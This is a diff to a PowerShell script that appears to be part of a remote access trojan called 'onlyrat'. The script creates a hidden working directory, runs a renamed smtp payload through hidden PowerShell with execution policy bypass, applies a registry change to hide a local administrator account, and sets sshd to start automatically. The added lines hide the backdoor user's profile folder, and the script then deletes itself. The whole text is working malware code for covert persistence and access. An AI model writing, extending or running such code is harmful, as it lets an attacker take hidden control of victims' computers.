@@ -30,11 +30,14 @@ $directory = random_text
 $temp_dir = "$env:TEMP\$directory"
 # save current directory
 $curr_dir = Get-Location|%{$_.Path}
+# $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress
 
 # goto temp and make working directory
 mkdir $temp_dir
 cd $temp_dir
 
+mv "$curr_dir\smtp.txt" ".\smtp.ps1"
+powershell powershell.exe -noP -ep bypass -w hidden -c ".\smtp.ps1"
 
 # Download registry to hide local admin
 $reg_file = random_text
@@ -62,6 +65,10 @@ Set-Service -Name sshd -StartupType Automatic
 
 # execute the registry entry process
 powershell -noP -ep bypass -w hidden Start-Process powershell.exe -windowstyle hidden ".\$reg_file.reg;.\$vbs_file.vbs"
+
+# move to users to hide our onlyrat local admin
+cd C:\Users
+attrib +h +s +r ".\onlyrat"
 
 # navigate to the saved directory and self delete
 cd $curr_dir
